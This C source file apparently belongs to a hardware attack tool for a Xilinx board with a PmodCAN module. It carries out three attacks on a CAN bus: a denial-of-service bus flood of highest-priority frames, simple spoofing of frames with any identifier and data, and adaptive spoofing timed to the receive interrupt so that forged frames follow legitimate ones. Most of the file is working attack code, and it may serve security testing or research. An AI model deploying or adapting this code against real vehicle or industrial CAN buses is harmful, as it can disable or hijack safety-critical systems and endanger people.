

#include "xil_printf.h"
#include "attack.h"
#include "lwip/tcp.h"
#include "PmodCAN.h"
#include "xgpiops.h"
#include "CanSetup.h"
#include "netif/xadapter.h"

PmodCAN myDevice;

Attack_StatusTypeDef startBusFlood();
Attack_StatusTypeDef startSimpleFrameSpoofing(u32 identifier, u8* data, u8 length, u8 ide);
Attack_StatusTypeDef startAdaptiveSpoofing(u32 identifier, u8* data, u8 length, u8 ide);

volatile int attack = No_Attack;
u8 ide;
u32 id;
u8 dlc;
u8 message_data[8];
u8 CNF[3];
u8 busfloodActive;

extern volatile int TcpFastTmrFlag;
extern volatile int TcpSlowTmrFlag;

//Preconfigured Bitrates
bitrate_t Bitrate_Lookup[NUM_INSTANCES_BITRATE] = {
		   {250000, 0x85, 0xEE, 0xC1 },	//250 kbit/s
		   {500000, 0x85, 0xEE, 0xC0 },	//500kbit/s
		   {1000000, 0x82, 0xD2, 0x40 }	//1 Mbit/s
};

/**
*
* @brief     Starts the BusFlood Attack on the connected CAN-Bus on the PMOD
*
*
* @return	Error Code that indicates whether the Attack was successful or not
*
******************************************************************************/

Attack_StatusTypeDef startBusFlood(struct netif *netif) {
	CAN_Message BusFloodMessage;
	u8 status;

	CAN_Initialize();

	//Create Busflood Message
	CAN_Message message;
	message.id  = 0x0;
	message.dlc = 0x4;
	message.eid = 0x0;
	message.rtr = 0;
	message.ide = 0;
	message.data[0] = 0x01;
	message.data[1] = 0x02;
	message.data[2] = 0x04;
	message.data[3] = 0x08;
	message.data[4] = 0x10;
	message.data[5] = 0x20;
	message.data[6] = 0x40;
	message.data[7] = 0x80;
	BusFloodMessage = message;

	// Wait for buffer 0, 1, 2 to be clear
	xil_printf("Waiting to send\r\n");
	do {
		status = CAN_ReadStatus(&myDevice);
	} while ((status & CAN_STATUS_TX012REQ_MASK) != 0);

	//Loading Busflood Message in all Buffers
	CAN_ModifyReg(&myDevice, CAN_CANINTE_REG_ADDR, CAN_CANINTE_TX012IF_MASK, 0);
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_CANINTF_TX012IF_MASK, 0);
	CAN_PrepareMessage(&myDevice, BusFloodMessage, CAN_Tx0);
	CAN_PrepareMessage(&myDevice, BusFloodMessage, CAN_Tx1);
	CAN_PrepareMessage(&myDevice, BusFloodMessage, CAN_Tx2);

	//Execute Busflood until stopped by User
	busfloodActive = 1;
	while (busfloodActive == 1) {
		xemacif_input(netif);
		CAN_RequestToSend(&myDevice, CAN_RTS_TXB012_MASK);
	}
	CAN_ModifyReg(&myDevice, CAN_CANINTE_REG_ADDR, CAN_CANINTE_TX012IF_MASK, 1);
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_CANINTF_TX012IF_MASK, 0);

	//Sending finished Frame
	xil_printf("Busflood finished\r\n");
	char message1[] = "Busflood finished";
	tcp_write(connection, message1, sizeof(message1), 1);
	CANCleanup();
	return Attack_OK;
}

/**
*
* @brief    Starts the Simple Frame Spoofing Attack on the connected CAN-Bus
* 			on the PMOD
*
*
* @return	Error Code that indicates whether the Attack was successful or not
*
******************************************************************************/

Attack_StatusTypeDef startSimpleFrameSpoofing(u32 identifier, u8* data, u8 length, u8 ide) {
	CAN_Message SimpleFrameSpoofingMessage;
	u8 status;

	CAN_Initialize();
	CAN_ModifyReg(&myDevice, CAN_CANINTE_REG_ADDR, CAN_CANINTE_TX012IF_MASK, 0);
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_CANINTF_TX012IF_MASK, 0);

	//Returning Error if data length is bigger than a CAN Frame can hold
	if (length > 8) {
		return Attack_ERROR;
	}

	//Setting Identifier for Spoofed Frame
	if(ide == 1) {
		SimpleFrameSpoofingMessage.id  = (u16) ((identifier & 0x1FFC0000) >> 18); //Mask for 11 bit Normal Identifier
		SimpleFrameSpoofingMessage.eid = identifier & 0x0003FFFF; //Mask for first 18 bit for extended identifier
	} else {
		SimpleFrameSpoofingMessage.id  = identifier & 0x7FF; //Mask for 11 bit Normal Identifier
	}

	//Setting DLC, IDE and Frame Format
	SimpleFrameSpoofingMessage.dlc = length;
	SimpleFrameSpoofingMessage.rtr = 0;
	SimpleFrameSpoofingMessage.ide = ide;

	//Setting Data for Spoofed Frame
	for(int i = 0; i < length; i++) {
		SimpleFrameSpoofingMessage.data[i] = data[i];
	}

	 // Wait for buffer 0 to be clear
	xil_printf("Waiting to send\r\n");
	do {
		status = CAN_ReadStatus(&myDevice);
	} while ((status & CAN_STATUS_TX0REQ_MASK) != 0);

	//Sending Message
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_CANINTF_TX0IF_MASK, 0);
	CAN_SendMessage(&myDevice, SimpleFrameSpoofingMessage, CAN_Tx0);
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_CANINTF_TX0IF_MASK, 0);

	// Wait for message to transmit successfully
	do {
		status = CAN_ReadStatus(&myDevice);
	} while ((status & CAN_STATUS_TX0IF_MASK) != 0);
	xil_printf("Message Send\r\n");
	xil_printf("Simple Frame Spoofing finished\r\n");

	char message[] = "Simple Frame Spoofing finished";
	tcp_write(connection, message, sizeof(message), 1);

	CANCleanup();

	return Attack_OK;
}

/**
*
* @brief    Starts the Adaptive Frame Spoofing Attack on the connected CAN-Bus
* 			on the PMOD
*
*
* @return	Error Code that indicates whether the Attack was successful or not
*
******************************************************************************/

Attack_StatusTypeDef startAdaptiveSpoofing(u32 identifier, u8* data, u8 length, u8 ide) {
	CAN_Message AdaptiveSpoofingMessage;
	u8 finished_flag = 0;

	CAN_Initialize_Adaptive_Spoofing(identifier, ide);
	xil_printf("CAN Initalized\r\n");

	//Returning Error if data length is bigger than a CAN Frame can hold
	if (length > 8) {
		return Attack_ERROR;
	}

	//Setting Identifier for Spoofed Frame
	if(ide == 1) {
		AdaptiveSpoofingMessage.id  = (u16) ((identifier & 0x1FFC0000) >> 18); //Mask for 11 bit Extended Identifier
		AdaptiveSpoofingMessage.eid = identifier & 0x0003FFFF; //Mask for first 18 bit for extended identifier
	} else {
		AdaptiveSpoofingMessage.id  = identifier & 0x7FF; //Mask for 11 bit normal Identifier
	}

	//Setting DLC, IDE and Frame Format
	AdaptiveSpoofingMessage.dlc = length;
	AdaptiveSpoofingMessage.rtr = 0;
	AdaptiveSpoofingMessage.ide = ide;

	//Setting Data for Spoofed Frame
	for(int i = 0; i < length; i++) {
		AdaptiveSpoofingMessage.data[i] = data[i];
	}

	//Setting Up Buffers, Filters and Masks
	CAN_PrepareMessage(&myDevice, AdaptiveSpoofingMessage, CAN_Tx0);
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_READBUF_RXB0SIDH, 0);
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_READBUF_RXB1SIDH, 0);
	CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_CANINTF_RX0IF_MASK, 0);

	//Sending Frame as soon as the Receive Interrupt is generated
	do {
		if((Xil_In32(XPAR_PMODCAN_0_AXI_LITE_GPIO_BASEADDR) & 0xC) != 0xC) {
			CAN_RequestToSend(&myDevice, CAN_RTS_TXB0_MASK);
			finished_flag = 1;
			xil_printf("Spoofing successfull\r\n");
		}
	} while(finished_flag != 1);
	xil_printf("Spoofing finished\r\n");
	char message[] = "Adaptive Spoofing finished";
	tcp_write(connection, message, sizeof(message), 1);

    CANCleanup();
	return Attack_OK;
}

/**
*
* @brief    Checks if Bitrate is preconfigured
*
*
* @return	Returns 0 if Bitrate is preconfigured, else returns 255
*
******************************************************************************/

u8 checkBitrate(u32 bitrate) {
	u8 ret_val = 255;
	for(int i = 0; i < NUM_INSTANCES_BITRATE; i++) {
		if(Bitrate_Lookup[i].bitrate == bitrate) {
			CNF[0] = Bitrate_Lookup[i].CNF3;
			CNF[1] = Bitrate_Lookup[i].CNF2;
			CNF[2] = Bitrate_Lookup[i].CNF1;
			ret_val = 0;
			break;
		}
	}
	return ret_val;
}